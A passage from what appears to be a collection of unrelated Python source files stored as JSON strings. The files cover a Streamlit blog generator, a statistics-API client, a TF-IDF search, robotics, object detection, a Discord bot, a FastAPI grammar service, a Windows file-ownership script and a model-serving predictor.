no_words=st.text_input('No of Words')\r\nwith col2:\r\n    blog_style=st.selectbox('Writing the blog for',\r\n                            ('Researchers','Data Scientist','Common People'),index=0)\r\n    \r\nsubmit=st.button(\"Generate\")\r\n\r\n## Final response\r\nif submit:\r\n    st.write(getLLamaresponse(input_text,no_words,blog_style))",
    "import csv\nimport json\nimport requests\nimport sys\n\n\ndef main():\n\n\n    # Wyszukiwanie tematu\n    wyszukiwanie = input(\"Szukaj tematu: \").lower()\n    wynik = wyszukiwarka(wyszukiwanie)\n    if len(wynik) < 1:\n        print(\"Nie znaleziono.\")\n    else:\n        for count, item in enumerate(wynik):\n            print(f\"{count + 1}. {item}\")\n            \n\n    # Wyb\u00f3r tematu z listy wynik\u00f3w\n    wybor = input(\"Wybierz numer z listy: \")    \n    while True:\n        try:\n            wybor = int(wybor)\n            if wybor in range(1, len(wynik) + 2):\n                print(wynik[wybor - 1])\n                id_zpo = (pobierz_id(wynik[wybor - 1]))\n                break\n        except ValueError:\n            print(\"Nieprawid\u0142owa warto\u015b\u0107.\")\n            break\n\n\n    try:\n        rok = int(input(\"Podaj rok: \"))\n    except ValueError:\n        sys.exit(\"Podaj czterocyfrow\u0105 liczb\u0119\")\n            \n    zapytanie = requests.get(f\"https://api-dbw.stat.gov.pl/api/1.1.0/variable/variable-data-section?id-zmienna={id_zpo[0]}&id-przekroj={id_zpo[1]}&id-rok={rok}&id-okres={id_zpo[2]}&ile-na-stronie=500&numer-strony=0&lang=pl\")\n\n    zapytanie = zapytanie.json()\n    print(json.dumps(zapytanie, indent=2))\n    sys.exit()\n\n\n    \n    \n# Wyszukiwarka zmiennych po stringach, pobiera nazwy z API, ale mog\u0142aby te\u017c z pliku gus_zmienne.csv\n# Obecnie wyniki nie s\u0105 sortowane, ale mog\u0105 by\u0107\ndef wyszukiwarka(string):\n    tematy = set()\n    znalezione = []\n    page = 0\n    while page <= 1:\n        zmienne = requests.get(f\"https://api-dbw.stat.gov.pl/api/1.1.0/variable/variable-section-periods?ile-na-stronie=5000&numer-strony={page}&lang=pl\")\n        for row in zmienne.json()[\"data\"]:\n            nazwa = str(row['nazwa-zmienna'])\n            tematy.add(nazwa)\n        page += 1\n\n    for temat in tematy:\n        check = temat.lower().find(string)\n        if check != -1:\n            znalezione.append(temat)\n    return znalezione\n\n\ndef pobierz_id(nazwa):\n    ids = []\n    with open(\"gus_zmienne.csv\", \"r\", encoding=\"utf-8\") as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            if row[\"nazwa-zmienna\"] == nazwa:\n                ids.append(int(row[\"id-zmienna\"]))\n                ids.append(int(row[\"id-przekroj\"]))\n                ids.append(int(row[\"id-okres\"]))\n                return ids\n    \n\nif __name__ == \"__main__\":\n    main()",
    "import pandas as pd\nimport re\nfrom dadmatools.normalizer import Normalizer\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nimport numpy as np\nimport string\nimport fasttext\n\ndf=pd.read_csv(\"normalized_data.csv\")\n\nnormalizer = Normalizer(\n    full_cleaning=False,\n    unify_chars=True,\n    refine_punc_spacing=True,\n    remove_extra_space=True,\n    remove_puncs=False,\n    remove_html=False,\n    remove_stop_word=False,\n    replace_email_with=\"<EMAIL>\",\n    replace_number_with=None,\n    replace_url_with=\"\",\n    replace_mobile_number_with=None,\n    replace_emoji_with=None,\n    replace_home_number_with=None\n)\n\ndef normalize_text(text):\n    if pd.isnull(text) or not isinstance(text, str):\n        return \"\" \n    return normalizer.normalize(text)\n\ncolumns_to_normalize = ['mavad', 'instruction']  \nfor column in columns_to_normalize:\n    df[column] = df[column].apply(normalize_text)\n\n\n\ndef preprocess_text_function(text):\n\n  # Define the punctuation characters to be removed\n  punctuations = string.punctuation\n\n  # Remove the punctuations from the text\n  text_without_punctuations = \"\".join([char for char in text if char not in punctuations])\n\n  return text_without_punctuations\n\n\n\nimport fasttext\n\n# TFIDF Class: a class to generate TFIDF for your docs and get top k relvant documents\nclass tfidf:\n    \n    def __init__(self, docs, ngram_range, bpe_model=None):\n        self._min_df = 1\n        self._max_df=0.8\n        self._max_features=3000\n        self._docs = docs\n        self._bpe = bpe_model\n        self._ngram_range = ngram_range\n        if self._bpe:\n            print(\"we are using bpe\")\n            self._model_tfidf = TfidfVectorizer(analyzer=\"word\", min_df=self._min_df, max_df=self._max_df, max_features=self._max_features, ngram_range=self._ngram_range, tokenizer= lambda x: self.bpe_tokenizer(x))\n        else:\n            self._model_tfidf = TfidfVectorizer(analyzer=\"word\", min_df=self._min_df, max_df=self._max_df, max_features=self._max_features, ngram_range=self._ngram_range)\n\n        self._matrix = self._model_tfidf.fit_transform(docs)\n        self._feature_names = self._model_tfidf.get_feature_names_out()\n\n        model_skipgram = fasttext.load_model('farsi-dedup-skipgram.bin')\n        self._tfidf_emb_vecs = np.vstack([model_skipgram.get_word_vector(word) for word in self._feature_names])\n\n\n        self._docs_emb = np.dot(self._matrix.toarray(), self._tfidf_emb_vecs)\n\n\n    def bpe_tokenizer(self, text):\n        tokens = self._bpe.re.split(r'[\u0648,\u060c]', text)\n        return tokens \n        \n\n    def tfidf_top_k(self, query, k=2):\n        \n        query_tfidf = self._model_tfidf.transform([query])\n\n\n        doc_scores = []\n\n\n        for doc in self._matrix:\n            doc_scores.append(cosine_similarity(query_tfidf, doc)[0][0])\n\n\n        sorted_scores = sorted(enumerate(doc_scores), key=lambda ind_score: ind_score[1], reverse=True)\n        if k!=-1:\n            top_doc_indices = [ind for ind, score in sorted_scores[:k]]\n        else:\n            top_doc_indices=sorted_scores\n        return top_doc_indices\n\n\n\n    def tfidf_weighted_top_k(self, query, k=2):\n\n        query_tfidf = self._model_tfidf.transform([query])\n        query_emb = np.dot(query_tfidf.toarray(), self._tfidf_emb_vecs)\n\n        doc_scores = []\n\n\n        for doc in self._docs_emb:\n            doc_scores.append(cosine_similarity(query_emb, doc.reshape(1, -1))[0][0])\n\n\n        sorted_scores = sorted(enumerate(doc_scores), key=lambda ind_score: ind_score[1], reverse=True)\n        if k!=-1:\n            top_doc_indices = [ind for ind, score in sorted_scores[:k]]\n        else:\n            top_doc_indices = sorted_scores\n        return top_doc_indices\n\ningredients_text = df[\"mavad\"].apply(preprocess_text_function)\n\ndef return_df(df=df):\n  return df\n\ndef return_list(query,sentence=ingredients_text):\n  tf_obj_word_1_1 = tfidf(docs=ingredients_text , ngram_range=(1,1), bpe_model=None)\n  result = tf_obj_word_1_1.tfidf_top_k(query, 5)\n  return result\n\n\n\n\n",
    "from pydrake.systems.framework import LeafSystem, Context, DiagramBuilder\nfrom pydrake.common.value import AbstractValue\nfrom pydrake.math import RotationMatrix\nfrom pydrake.math import RotationMatrix, RollPitchYaw\nfrom pydrake.common.eigen_geometry import Quaternion\n\nimport numpy as np\n\nfrom ..robots.WalkingRobot import LLCActuationCommand, WalkingRobot\nfrom ..observers.WalkingObserver import WalkingObserver\nfrom ..targets.WalkingTarget import WalkingTarget, WalkingTargetValue\n\nclass WalkingController(LeafSystem):\n    def __init__(self,n_act):\n        LeafSystem.__init__(self)\n        self.n_act = n_act\n        self.actuation_data:LLCActuationCommand\n        self.actuation_data = LLCActuationCommand(n_act)\n        \n        self.target_in = self.DeclareAbstractInputPort('target_in',AbstractValue.Make(WalkingTargetValue()))\n        self.llc_out = self.DeclareAbstractOutputPort('llc_out',lambda: AbstractValue.Make(LLCActuationCommand(n_act)),self.CalcOutput)\n\n    def CalcOutput(self,context: Context,output: AbstractValue):\n        output.set_value(self.actuation_data)\n        return\n    \n    def AddToBuilderAndConnect(self, builder: DiagramBuilder, robot: WalkingRobot, target: WalkingTarget = None, observer: WalkingObserver = None):\n        builder.AddSystem(self)\n        builder.Connect(self.llc_out,robot.llc_actuation_in)\n        if observer is None:\n            builder.Connect(robot.cheater_state_out,self.state_in)\n        else:\n            builder.Connect(observer.state_out,self.state_in)\n        builder.Connect(observer.state_out,robot.state_in)\n        if target is None:  \n            target = WalkingTarget()\n            builder.AddSystem(target)\n        builder.Connect(target.target_value_out,self.target_in)\n        \n        return\n\ndef WorldToRobotCoordinates(qv_world: np.array, nq) -> np.array:\n    qv_robot = qv_world.copy()\n    qv_robot[4:6] = 0.\n    rot = RollPitchYaw(Quaternion(qv_robot[:4]/np.linalg.norm(qv_robot[:4])))\n    world_yaw = RotationMatrix(RollPitchYaw([0.,0.,rot.yaw_angle()]))\n    qv_robot[4:6] = 0.\n    yaw_inv = world_yaw.inverse()\n    qv_robot[:4] = (yaw_inv.multiply(RotationMatrix(rot))).ToQuaternion().wxyz()\n    qv_robot[nq:nq+3] = yaw_inv.multiply(qv_robot[nq:nq+3])\n    qv_robot[nq+3:nq+6] = yaw_inv.multiply(qv_robot[nq+3:nq+6])\n\n    return qv_robot",
    "import os\nimport cv2\nimport numpy as np\nfrom matplotlib import pyplot as plt\nimport tensorflow as tf\nfrom object_detection.utils import label_map_util\nfrom object_detection.utils import visualization_utils as viz_utils\nfrom load_model import detect_fn\n\nIMAGES_NAMES = [\"true-01\", \"true-02\", 'true-03', 'true-04', 'true-05', \"false-01\", \"false-02\", 'false-03', 'false-04', 'false-05']\n\nfor IMAGE_NAME in IMAGES_NAMES: \n\tIMAGE_PATH = os.path.join(\"images\", \"evaluation\", f\"{IMAGE_NAME}.jpg\")\n\n\tcategory_index = label_map_util.create_category_index_from_labelmap(\"label_map.pbtxt\")\n\n\timage = cv2.imread(IMAGE_PATH)\n\timage_np = np.array(image)\n\n\tinput_tensor = tf.convert_to_tensor(np.expand_dims(image_np, 0), dtype=tf.float32)\n\tdetections = detect_fn(input_tensor)\n\n\tnum_detections = int(detections.pop('num_detections'))\n\tdetections = {\n\t\tkey: value[0, :num_detections].numpy() for key, value in detections.items()\n\t}\n\n\tdetections['detection_classes'] = detections['detection_classes'].astype(np.int64)\n\n\tstrawberry_indices = np.where(detections['detection_classes'] == 0)[0]\n\tstrawberry_boxes = detections['detection_boxes'][strawberry_indices]\n\tstrawberry_scores = detections['detection_scores'][strawberry_indices]\n\n\tlabel_id_offset = 1\n\timage_np_with_detections = image_np.copy()\n\n\tviz_utils.visualize_boxes_and_labels_on_image_array(\n\t\timage_np_with_detections,\n\t\tstrawberry_boxes,\n\t\tdetections['detection_classes'][strawberry_indices] + label_id_offset,\n\t\tstrawberry_scores,\n\t\tcategory_index,\n\t\tuse_normalized_coordinates=True,\n\t\tmax_boxes_to_draw=5,\n\t\tmin_score_thresh=0.5,\n\t\tagnostic_mode=False\n\t)\n\n\t# final_image = cv2.cvtColor(image_np_with_detections, cv2.COLOR_RGB2BGR)\n\tcv2.imwrite(os.path.join(\"images\", \"evaluation\", f\"{IMAGE_NAME}-detected.png\"), image_np_with_detections)\n",
    "import pandas as pd\nif 'transformer' not in globals():\n    from mage_ai.data_preparation.decorators import transformer\nif 'test' not in globals():\n    from mage_ai.data_preparation.decorators import test\n\n\n@transformer\ndef transform(data, *args, **kwargs):\n    \"\"\"\n    Template code for a transformer block.\n\n    Add more parameters to this function if this block has multiple parent blocks.\n    There should be one parameter for each output variable from each parent block.\n\n    Args:\n        data: The output from the upstream parent block\n        args: The output from any additional upstream blocks (if applicable)\n\n    Returns:\n        Anything (e.g. data frame, dictionary, array, int, str, etc.)\n    \"\"\"\n    data_fixed = data.join(pd.json_normalize(data['node'])).drop('node', axis='columns')\n\n    data_fixed = data_fixed.explode('topics.edges', ignore_index=True)\n    data_fixed = data_fixed.join(pd.json_normalize(data_fixed['topics.edges'])).drop('topics.edges', axis='columns')\n    data_fixed.rename(columns={'node.createdAt':'topic_createdAt', 'node.id': 'topic_id', 'node.name': 'topic_name' }, inplace=True)\n\n    ph_posts_dtypes = {\n        'cursor': str,\n        'commentsCount': pd.Int64Dtype(),\n        'description': str, \n        'id': pd.Int64Dtype(),\n        'name': str,\n        'slug': str,\n        'tagline': str,\n        'url': str,\n        'userId': pd.Int64Dtype(), \n        'votesCount': pd.Int64Dtype(),\n        'website': str,\n        'topic_id': pd.Int64Dtype(), \n        'topic_name': str\n    }\n\n    parse_dates = ['createdAt', 'topic_createdAt']\n\n    data_fixed = data_fixed.astype(ph_posts_dtypes)\n\n    data_fixed['createdAt'] = pd.to_datetime(data_fixed['createdAt'])\n    data_fixed['topic_createdAt'] = pd.to_datetime(data_fixed['topic_createdAt'])\n\n    print(len(data_fixed))\n    \n    return data_fixed\n\n\n@test\ndef test_output(output, *args) -> None:\n    \"\"\"\n    Template code for testing the output of the block.\n    \"\"\"\n    assert output is not None, 'The output is undefined'\n",
    "import sqlite3\nfrom models.movie import Movie\n\n\nclass Database:\n    def __init__(self) -> None:\n        pass\n\n    def createTables(self):\n        self.conn.cursor().execute(\n            \"\"\"\n            CREATE TABLE IF NOT EXISTS movies (\n                id INTEGER PRIMARY KEY,\n                title TEXT,\n                isSeries BOOL,\n                description TEXT,\n                magnet TEXT,\n                language_code TEXT,\n                trailer_YTB_ID TEXT,\n                image_url TEXT,\n                tmdb_url TEXT\n            )\n        \"\"\"\n        )\n        self.conn.commit()\n\n    def newMovie(self, movie: Movie):\n        data: tuple = (\n            movie.title,\n            movie.isSeries,\n            movie.description,\n            movie.magnet,\n            movie.language_code,\n            movie.trailer_YTB_ID,\n            movie.image_url,\n            movie.tmdb_url,\n        )\n\n        self.conn.cursor().execute(\n            f\"\"\"\n            INSERT INTO movies\n            (title, isSeries, description, magnet, language_code, trailer_YTB_ID, image_url, tmdb_url)\n            VALUES\n            (?, ?, ?, ?, ?, ?, ?, ?)\n            \"\"\",\n            data,\n        )\n\n        self.conn.commit()\n\n    def getMovies(\n        self, id: int | None = None, tmdbUrl: str | None = None\n    ) -> list[Movie]:\n        cursor = self.conn.cursor()\n        if id == None and tmdbUrl == None:\n            cursor.execute(\n                \"\"\"\n                SELECT * from movies\n                \"\"\"\n            )\n        elif id != None:\n            cursor.execute(\n                \"\"\"\n                SELECT * from movies WHERE id=(?)\n                \"\"\",\n                id,\n            )\n        elif tmdbUrl != None:\n            cursor.execute(\n                \"\"\"\n                SELECT * from movies WHERE tmdb_url=(?)\n                \"\"\",\n                (tmdbUrl,),\n            )\n\n        results = cursor.fetchall()\n\n        movies = []\n\n        for result in results:\n            movies.append(\n                Movie(\n                    id=result[0],\n                    title=result[1],\n                    isSeries=result[2],\n                    description=result[3],\n                    magnet=result[4],\n                    language_code=result[5],\n                    trailer_YTB_ID=result[6],\n                    image_url=result[7],\n                    tmdb_url=result[8],\n                )\n            )\n        return movies\n\n    def init(self) -> sqlite3.Cursor:\n        conn = sqlite3.connect(\"database.db\")\n        cursor = conn.cursor()\n        self.conn: sqlite3.Connection = conn\n        self.createTables()\n",
    "import speech_recognition as sr\nimport pyttsx3\nimport datetime\nimport webbrowser\n\nrecognizer = sr.Recognizer()\nengine = pyttsx3.init()\n\ndef speak(text):\n    engine.say(text)\n    engine.runAndWait()\n\ndef listen():\n    with sr.Microphone() as source:\n        print(\"Listening...\")\n        recognizer.adjust_for_ambient_noise(source)\n        audio = recognizer.listen(source)\n        \n        try:\n            command = recognizer.recognize_google(audio)\n            print(\"You said:\", command)\n            return command.lower()\n        except sr.UnknownValueError:\n            print(\"Sorry, I didn't understand that.\")\n            return \"\"\n        except sr.RequestError as e:\n            print(\"Could not request results; {0}\".format(e))\n            return \"\"\n\ndef greet():\n    hour = datetime.datetime.now().hour\n    if 0 <= hour < 12:\n        speak(\"Good morning!\")\n    elif 12 <= hour < 18:\n        speak(\"Good afternoon!\")\n    else:\n        speak(\"Good evening!\")\n\ndef main():\n    greet()\n    speak(\"How can I assist you today?\")\n    \n    while True:\n        command = listen()\n        \n        if \"hello\" in command:\n            speak(\"Hello! How can I assist you today?\")\n        elif \"time\" in command:\n            current_time = datetime.datetime.now().strftime(\"%I:%M %p\")\n            speak(f\"The current time is {current_time}.\")\n        elif \"date\" in command:\n            current_date = datetime.datetime.now().strftime(\"%A, %B %d, %Y\")\n            speak(f\"Today is {current_date}.\")\n        elif \"youtube\" in command:\n            webbrowser.open(\"https://www.youtube.com/?app\")\n        elif \"thank you\" in command:\n            speak(\"You're welcome!\")\n        elif \"bye\" in command:\n            speak(\"Goodbye!\")\n            break\n        else:\n            speak(\"Sorry, I didn't understand that.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import discord\nfrom discord import app_commands\nfrom discord.ext import commands, tasks\nimport os\nimport asyncio\nfrom time import *\nimport subprocess\n#from config import TOKEN\n\nbot = commands.Bot(command_prefix = \"!\", intents = discord.Intents.all())\nlog_channel_id = 1204434514202329100  # Variable to store the log channel ID\nonline = False\nplayers = []\n\n@bot.event\nasync def on_ready():\n    print(f'{bot.user} has connected to Discord!')\n    try:\n        synced = await bot.tree.sync()\n        print(f\"synced {len(synced)} command(s)\")\n    except Exception as e:\n        print(e)\n    with open(\"users.txt\", \"r\") as file:\n        indexi = 0\n        for line in file.readlines():\n            split = line.split(\":\")\n            name = int(split[0])\n            score = int(split[1])\n            print(name)\n            y = player(int(name), score, indexi)\n            players.append(y)\n            indexi += 1\n    check_logs.start()\n\n@bot.tree.command(name=\"credits\")\n@app_commands.choices(option=[\n    app_commands.Choice(name=\"Add\", value=\"Add\"),\n    app_commands.Choice(name=\"Remove\", value=\"Remove\"),\n    app_commands.Choice(name=\"Set\", value=\"Set\"),\n    app_commands.Choice(name=\"Show\", value=\"Show\")\n]\n)\nasync def credits(ctx: discord.Interaction, option: app_commands.Choice[str], user: discord.User, value: int = 0):\n    if (ctx.user.guild_permissions.administrator):\n        for x in players:\n            print(x.name)\n            print(user.id)\n            if (x.name == user.id):\n                if (option.value == \"Add\"):\n                    x.credits += int(value)\n                elif (option.value == \"Remove\"):\n                    x.credits -= int(value)\n                elif (option.value == \"Show\"):\n                    await ctx.response.send_message(\"User has the social credit score of \" + str(x.credits) + \".\")\n                    return\n                elif (option.value == \"Set\"):\n                    x.credits = int(value)\n                else:\n                    await ctx.response.send_message(\"Please give a valid option!\")\n                with open(\"users.txt\", \"r\") as file:\n                    lines = file.readlines()\n                    lines[x.line] = str(x.name) + \":\" + str(x.credits) + \"\\n\"\n                    print(\"hi\")\n                with open(\"users.txt\", \"w\") as file:\n                    file.write(\"\".join(lines))\n                await ctx.response.send_message(\"Added/removed/set social credit.\")\n                return\n        if (option.value == \"Add\"):\n            y = player(user.id, value, len(players))\n            players.append(y)\n            await ctx.response.send_message(\"Created new user and applied value!\")\n            with open(\"users.txt\", \"r\") as file:\n                lines = file.read()\n                print(len(players))\n                if (len(players) > 1):\n                    lines = lines + \"\\n\" + str(y.name) + \":\" + str(y.credits)\n                else:\n                    lines = str(y.name) + \":\" + str(y.credits)\n            with open(\"users.txt\", \"w\") as file:\n                file.write(\"\".join(lines))\n        elif (option.value == \"Remove\"):\n            y = player(user.id, -value, len(players))\n            players.append(y)\n            with open(\"users.txt\", \"r\") as file:\n                lines = file.read()\n                if (len(players) > 1):\n                    lines = lines + \"\\n\" + str(y.name) + \":\" + str(y.credits)\n                else:\n                    lines = str(y.name) + \":\" + str(y.credits)\n            with open(\"users.txt\", \"w\") as file:\n                file.write(\"\".join(lines))\n            await ctx.response.send_message(\"Created new user and applied value!\")\n        elif (option.value == \"Show\"):\n            y = player(user.id, 0, len(players))\n            players.append(y)\n            with open(\"users.txt\", \"r\") as file:\n                lines = file.read()\n                if (len(players) > 1):\n                    lines = lines + \"\\n\" + str(y.name) + \":\" + str(y.credits)\n                else:\n                    lines = str(y.name) + \":\" + str(y.credits)\n            with open(\"users.txt\", \"w\") as file:\n                file.write(\"\".join(lines))\n            await ctx.response.send_message(\"User has the social credit score of 0.\")\n        elif (option.value == \"Set\"):\n            y = player(user.id, value, len(players))\n            players.append(y)\n            with open(\"users.txt\", \"r\") as file:\n                lines = file.read()\n                if (len(players) > 1):\n                    lines = lines + \"\\n\" + str(y.name) + \":\" + str(y.credits)\n                else:\n                    lines = str(y.name) + \":\" + str(y.credits)\n            with open(\"users.txt\", \"w\") as file:\n                file.write(\"\".join(lines))\n            await ctx.response.send_message(\"Set social credit score.\")\n        else:\n            await ctx.response.send_message(\"Please give a valid option!\")\n    else:\n        await ctx.response.send_message(\"You dont meet the repuired per",
    "from langchain.chains.llm import LLMChain\nfrom langchain.memory.chat_memory import BaseChatMemory\nfrom langchain.prompts import ChatPromptTemplate\n\n\nclass AbstractLLM:\n    def __init__(\n        self,\n        config,\n        session_id=None,\n        parent_session_id=None,\n        dataset=None,\n        llm_api_key=None,\n        dbsession=None,\n    ):\n        \"\"\"\n        :param config: Configuration dictionary\n\n        The constructor of the AbstractLLM class allows users to pass\n        a configuration dictionary to the LLM. This configuration dictionary\n        can be used to configure the LLM temperature, prompt and other\n        necessities.\n        \"\"\"\n        if not isinstance(config, dict):\n            raise ValueError(\"Config must be a dictionary\")\n\n        self.config = config\n        self.prompt = None\n        self.session_id = None\n        self.relevant_contents = None\n        if session_id:\n            self.session_id = (\n                session_id if dataset is None else f\"{dataset}_{session_id}\"\n            )\n        self.dataset = dataset\n        self.llm_api_key = self.config.get(\"llm_api_key\", llm_api_key)\n        self.parent_session_id = parent_session_id\n        self.dbsession = dbsession\n\n    def get_prompt(self, input) -> ChatPromptTemplate:\n        \"\"\"\n        Function that generates the prompt for the LLM.\n        \"\"\"\n        raise NotImplementedError(\"Prompt must be implemented\")\n\n    @property\n    def memory(self) -> BaseChatMemory:\n        \"\"\"\n        Returns the memory instance\n        \"\"\"\n        raise NotImplementedError(\"Memory must be implemented\")\n\n    @property\n    def llm(self) -> LLMChain:\n        \"\"\"\n        Returns the LLM instance. If a memory instance is provided,\n        the LLM instance should be initialized with the memory instance.\n\n        If no memory instance is provided, the LLM instance should be\n        initialized without a memory instance.\n        \"\"\"\n        raise NotImplementedError(\"LLM must be implemented\")\n\n    def preprocess(self, input: str) -> str:\n        \"\"\"\n        Function that pre-process the LLM input, enabling users\n        to modify the input before it is processed by the LLM.\n\n        This can be used to add context or prefixes to the LLM.\n        \"\"\"\n        return input\n\n    def generate_prompt(self, text: str) -> str:\n        \"\"\"\n        Function that generates the prompt using PromptTemplate for the LLM.\n        \"\"\"\n        return text\n\n    def postprocess(self, output: str) -> str:\n        \"\"\"\n        Function that post-process the LLM output, enabling users\n        to modify the output before it is returned to the user.\n        \"\"\"\n        return output\n\n    def process(self, input: str):\n        \"\"\"\n        Function that encapsulates the pre-processing, processing and post-processing\n        of the LLM.\n        \"\"\"\n        processed_input = self.preprocess(input)\n        self.generate_prompt(processed_input)\n        if len(self.relevant_contents) == 0 and self.config.get(\"prompt\").get(\n            \"fallback_not_found_relevant_contents\"\n        ):\n            return {\n                \"text\": self.config.get(\"prompt\").get(\n                    \"fallback_not_found_relevant_contents\"\n                )\n            }\n        output = self.llm(\n            {\n                \"user_message\": processed_input,\n            }\n        )\n        processed_output = self.postprocess(output)\n        return processed_output\n\n    @property\n    def messages(self):\n        \"\"\"\n        Returns the messages from the memory instance\n        \"\"\"\n        return self.memory.messages",
    "import re\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\nfrom transformers import pipeline\n\n# App Initialization\napp = FastAPI()\n\n# Model Configuration and Initialization - Cached globally\nchecker_model_name = \"textattack/roberta-base-CoLA\"\ncorrector_model_name = \"vennify/t5-base-grammar-correction\"\n\ndef initialize_models():\n    # We only need the corrector model as we are skipping the checks\n    corrector = pipeline(\"text2text-generation\", model=corrector_model_name, max_length=240)\n    return corrector\n\ncorrector = initialize_models()\n\n# Utility Functions\ndef split_text(text: str) -> list:\n    # Optimized regex: Making sure it's efficient and suited for purpose\n    sentences = re.split(r\"\\.\\s+(?=[A-Z])\", text)\n    sentence_batches = []\n    temp_batch = []\n    \n    for sentence in sentences:\n        temp_batch.append(sentence)\n        if len(temp_batch) >= 2 and len(temp_batch) <= 3 or sentence == sentences[-1]:\n            sentence_batches.append(temp_batch)\n            temp_batch = []\n    \n    return sentence_batches\n\n# Data Model\nclass Prompt(BaseModel):\n    text: str\n\n# API Endpoints\n@app.get(\"/\")\nasync def health_check():\n    return {\"status\": \"healthy\"}\n\n@app.post(\"/correct_grammar\")\nasync def correct_grammar(prompt: Prompt):\n    sentence_batches = split_text(prompt.text)\n    if not sentence_batches:\n        return {\"error\": \"No text provided for grammar correction\"}, 400\n\n    try:\n        corrected_text = []\n        for batch in sentence_batches:\n            raw_text = \" \".join(batch)\n            corrected_batch = corrector(raw_text)\n            corrected_text.append(corrected_batch[0][\"generated_text\"])\n        corrected_text = \" \".join(corrected_text)\n        return corrected_text\n    except Exception as e:\n        return {\"error\": str(e)}, 500",
    "import pygame\r\n\r\nclass TButton:\r\n    NORMAL = 0\r\n    MOVE = 1\r\n    DOWN = 2\r\n\r\n    def __init__(self, x, y, text, imgNormal, imgMove=None, imgDown=None, callBackFunc=None, font=None, rgb=(0, 0, 0)):\r\n\r\n        self.imgs = []\r\n        if not imgNormal:\r\n            raise Exception(\"\u8bf7\u8bbe\u7f6e\u666e\u901a\u72b6\u6001\u7684\u56fe\u7247\")\r\n        self.imgs.append(imgNormal)  # \u666e\u901a\u72b6\u6001\u663e\u793a\u7684\u56fe\u7247\r\n        self.imgs.append(imgMove)  # \u88ab\u9009\u4e2d\u65f6\u663e\u793a\u7684\u56fe\u7247\r\n        self.imgs.append(imgDown)  # \u88ab\u6309\u4e0b\u65f6\u7684\u56fe\u7247\r\n        for i in range(2, 0, -1):\r\n            if not self.imgs[i]:\r\n                self.imgs[i] = self.imgs[i - 1]\r\n\r\n        self.callBackFunc = callBackFunc\r\n        self.status = TButton.NORMAL\r\n        self.x = x\r\n        self.y = y\r\n        self.w = imgNormal.get_width()\r\n        self.h = imgNormal.get_height()\r\n        self.text = text\r\n        self.font = font\r\n        self.textSuf = font.render(self.text, True, rgb)\r\n\r\n    def draw(self, destSuf):\r\n        dx = (self.w / 2) - (self.textSuf.get_width() / 2)\r\n        dy = (self.h / 2) - (self.textSuf.get_height() / 2)\r\n\r\n        if self.imgs[self.status]:\r\n            destSuf.blit(self.imgs[self.status], [self.x, self.y])\r\n        destSuf.blit(self.textSuf, [self.x + dx, self.y + dy])\r\n\r\n    def colli(self, x, y):\r\n        if self.x <= x <= self.x + self.w and self.y <= y <= self.y + self.h:\r\n            return True\r\n        else:\r\n            return False\r\n\r\n    def getFocus(self, x, y):\r\n        if self.status == TButton.DOWN:\r\n            return\r\n        if self.colli(x, y):\r\n            self.status = TButton.MOVE\r\n        else:\r\n            self.status = TButton.NORMAL\r\n\r\n    def mouseDown(self, x, y):\r\n        if self.colli(x, y):\r\n            self.status = TButton.DOWN\r\n\r\n    def mouseUp(self, x, y):\r\n        if self.colli(x, y):\r\n            self.status = TButton.MOVE\r\n            if self.callBackFunc:\r\n                surface = pygame.display.get_surface()\r\n                return self.callBackFunc()\r\n        else:\r\n            self.status = TButton.NORMAL\r\n            return",
    "import os\r\nimport subprocess\r\n\r\ndef take_ownership(folder_path, owner_name):\r\n    # List all files and directories in the given folder\r\n    for root, dirs, files in os.walk(folder_path):\r\n        # Take ownership of files in the current directory\r\n        for file_name in files:\r\n            file_path = os.path.join(root, file_name)\r\n            print(f\"Taking ownership of file: {file_path}\")\r\n\r\n            # Execute takeown command to take ownership of the file\r\n            try:\r\n                subprocess.run(['takeown', '/F', file_path], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error taking ownership of {file_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n            # Optional: Grant full control permissions to the specified owner\r\n            try:\r\n                subprocess.run(['icacls', file_path, '/grant', f\"{owner_name}:(F)\"], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error granting permissions for {owner_name} on {file_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n        # Recursively take ownership of files in subdirectories\r\n        for dir_name in dirs:\r\n            dir_path = os.path.join(root, dir_name)\r\n            print(f\"Taking ownership of folder: {dir_path}\")\r\n\r\n            # Execute takeown command to take ownership of the directory\r\n            try:\r\n                subprocess.run(['takeown', '/F', dir_path], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error taking ownership of {dir_path}: {e.stderr.decode('utf-8')}\")\r\n\r\n            # Optional: Grant full control permissions to the specified owner\r\n            try:\r\n                subprocess.run(['icacls', dir_path, '/grant', f\"{owner_name}:(F)\"], check=True, capture_output=True)\r\n            except subprocess.CalledProcessError as e:\r\n                print(f\"Error granting permissions for {owner_name} on {dir_path}: {e.stderr.decode('utf-8')}\")\r\n\r\nif __name__ == \"__main__\":\r\n    folder_path = r\"Replace with the path to your folder\"  # path of your folder\r\n    owner_name = \"Replace with the desired owner name(User)\"  # Owner name\r\n\r\n    take_ownership(folder_path, owner_name)",
    "from cog import BasePredictor, Input\r\nimport os\r\nimport time\r\nimport subprocess\r\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\r\n\r\nMODEL_ID = \"mistral-community/Mixtral-8x22B-v0.1-4bit\"\r\nMODEL_CACHE = \"checkpoints\"\r\nMODEL_URL = \"https://weights.replicate.delivery/default/mistral-community/Mixtral-8x22B-v0.1-4bit/model.tar\"\r\n\r\ndef download_weights(url, dest):\r\n    start = time.time()\r\n    print(\"downloading url: \", url)\r\n    print(\"downloading to: \", dest)\r\n    subprocess.check_call([\"pget\", \"-x\", url, dest], close_fds=False)\r\n    print(\"downloading took: \", time.time() - start)\r\n\r\nclass Predictor(BasePredictor):\r\n    def setup(self) -> None:\r\n        \"\"\"Load the model into memory to make running multiple predictions efficient\"\"\"\r\n        #Download with Pget\r\n        if not os.path.exists(MODEL_CACHE):\r\n            download_weights(MODEL_URL, MODEL_CACHE)\r\n        self.tokenizer = AutoTokenizer.from_pretrained(\r\n            MODEL_ID,\r\n            cache_dir=MODEL_CACHE\r\n        )\r\n        self.model = 